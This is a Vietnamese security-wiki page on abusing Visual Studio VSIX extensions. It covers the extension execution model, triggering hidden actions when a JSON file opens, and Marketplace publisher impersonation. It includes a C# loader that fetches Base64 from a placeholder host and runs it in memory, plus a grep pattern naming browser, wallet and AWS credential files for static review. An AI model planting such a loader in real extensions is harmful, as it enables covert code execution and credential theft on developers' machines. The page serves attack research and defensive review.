# Lạm dụng extension VSIX của Visual Studio

{{#include ../banners/hacktricks-training.md}}

Extension của Visual Studio có thể biến hoạt động chỉnh sửa thông thường thành việc thực thi mã dưới danh tính của người dùng đang đăng nhập. VSIX độc hại, nhà phát hành giả mạo hoặc bản cập nhật extension bị xâm phạm có thể tiếp cận người dùng qua các kênh cài đặt thông thường. Cài đặt với lời nhắc quyền quản trị là một quy trình cài đặt có sự đồng ý, không phải hành vi tự động leo thang đặc quyền.<sup>[[1]](#references)</sup>

## Mô hình thực thi

Các extension VSSDK cổ điển thường thực thi bên trong `devenv.exe`. Mô hình `VisualStudio.Extensibility` mới hơn chủ yếu chạy các extension .NET hiện đại ngoài tiến trình: Visual Studio chuyển tiếp các lệnh gọi đến một tiến trình `Microsoft.ServiceHub.Host.Extensibility` chuyên dụng, giúp cô lập độ ổn định của IDE nhưng **không** cách ly extension khỏi các quyền Windows của người dùng. Tên tệp thực thi chính xác có thể bao gồm hậu tố kiến trúc, chẳng hạn như `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Kích hoạt khi người dùng thao tác thông thường trong trình soạn thảo

Thay vì chỉ cung cấp một lệnh trên menu dễ gây chú ý, extension có thể triển khai `ITextViewOpenClosedListener`. Callback `TextViewOpenedAsync` được gọi cho các tài liệu phù hợp, trong khi `TextViewExtensionConfiguration.AppliesTo` có thể giới hạn việc kích hoạt ở một loại phổ biến như JSON. Một trình định dạng hoặc linter thực sự vẫn có thể thực hiện chức năng được quảng bá, đồng thời chạy một hành động thứ hai như tác dụng phụ khi mở tệp.<sup>[[1]](#references)[[3]](#references)</sup>

Mẫu rút gọn dưới đây minh họa các điểm thực thi quan trọng; để dễ hiểu, mẫu này lược bỏ trình định dạng hợp lệ và phần xử lý lỗi.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Trình tải assembly managed trong bộ nhớ được kích hoạt bởi sự kiện</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Chuỗi này tải xuống văn bản Base64, giải mã thành các byte assembly, nạp assembly từ `MemoryStream` thông qua `AssemblyLoadContext` có thể thu hồi, gọi `EntryPoint` bằng reflection với tham số rỗng hoặc `string[]`, chờ các entry point bất đồng bộ, rồi unload context. Stage thứ hai không được ghi xuống đĩa, dù VSIX và DLL extension chính vẫn là artefact trên đĩa. Base64 không cung cấp tính xác thực hay bảo mật; dùng HTTP cũng cho phép attacker đứng giữa thay thế phản hồi.<sup>[[1]](#references)</sup>

Các biến thể vận hành bao gồm bỏ qua mọi exception để tính năng được quảng bá vẫn tiếp tục khi quá trình staging thất bại, hoặc dùng `ITextViewChangedListener` để kích hoạt sau khi chỉnh sửa. Code chạy trong extension host và có thể sử dụng các managed API, P/Invoke, file, thông tin xác thực và tiến trình con mà người dùng đó có quyền truy cập.<sup>[[1]](#references)</sup>

Để xem một bề mặt thực thi liên quan, dành riêng cho trình soạn thảo và dựa trên cơ chế tự động nạp native plugin, xem:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Lạm dụng độ tin cậy của Marketplace và kênh phân phối

VSIX có thể được gửi trực tiếp dưới dạng file được chia sẻ hoặc qua phishing, từ web Marketplace hoặc thông qua trình duyệt Marketplace tích hợp trong Visual Studio. Cơ chế đăng ký publisher chủ yếu áp dụng tính duy nhất và danh sách từ bị hạn chế, nên có thể cho phép tạo danh tính publisher trông có vẻ tương tự; chiếm quyền một publisher hoặc extension đã được tin cậy còn hiệu quả hơn vì tận dụng được lượng người dùng đã cài đặt sẵn. Việc cài đặt từ Marketplace gọi Visual Studio Installer và tạm thời đặt VSIX đã tải xuống trong `%LOCALAPPDATA%\Temp`; `payload.vsix` cũng được sử dụng hợp pháp, vì vậy chỉ riêng tên file này không phải là dấu hiệu đáng ngờ.<sup>[[1]](#references)</sup>

MDSec không xác định được URL protocol nào của Visual Studio có thể cài đặt extension trực tiếp. Kẻ vận hành vẫn cần người dùng cài đặt/đặt niềm tin vào VSIX, hoặc phải xâm phạm kênh phân phối của một extension hiện có. Gói `AllUsers` được cài đặt trong thư mục cài đặt Visual Studio và có thể yêu cầu nâng quyền, nhưng đây là hành vi cài đặt thông thường có sự đồng ý, chứ không phải con đường tự động để có quyền administrator hoặc SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Kiểm tra tĩnh trên quy mô lớn

Các gói VSIX thường là container ZIP, vì vậy quy trình đánh giá Marketplace an toàn có thể liệt kê các gói, giải nén chúng **mà không nạp code extension**, phân tích manifest, xác định các bề mặt thực thi và decompile managed assembly bằng `ilspycmd`. Ưu tiên các assembly thuộc extension sau khi loại trừ những dependency đi kèm phổ biến, rồi đối chiếu các chuỗi liên quan đến kho thông tin xác thực với những nhóm hành vi như đọc file kết hợp gửi qua mạng, mã hóa kết hợp gửi đi, tải xuống kết hợp thực thi, truy cập credential manager kết hợp truy cập mạng, hoặc chụp ảnh màn hình kết hợp gửi đi.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Cũng kiểm kê các DLL native, MSBuild targets, scripts, T4 templates và payload của trình cài đặt thay vì cho rằng mọi bề mặt thực thi đều là managed code. So sánh hành vi đáng ngờ với mục đích được khai báo trong manifest; telemetry và các updater hợp pháp có thể giống hoạt động exfiltration hoặc staging. Chỉ rà soát tĩnh sẽ bỏ sót code được đóng gói, làm rối, phân giải động và chưa hoạt động; chỉ rà soát phiên bản mới nhất sẽ bỏ sót các bản phát hành cũ có mã độc.<sup>[[1]](#references)</sup>

VS Code sử dụng extension host và manifest khác. Để xem cách một writable share kích hoạt quá trình cài đặt extension VS Code tự động, hãy xem [VS Code extension drop-share execution](vscode-extension-abuse.md).

Một kiểu tấn công khác khi tải project có thể thực thi một [MSBuild `GetFrameworkPaths` target](visual-studio-project-msbuild-execution.md) độc hại mà không cần cài VSIX.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Các extension của Visual Studio được xem xét lại](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Giới thiệu về VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Cấu trúc của một gói VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - công cụ .NET ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Chiến dịch Blinder Tunnel nhắm vào cơ sở hạ tầng Iraq](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
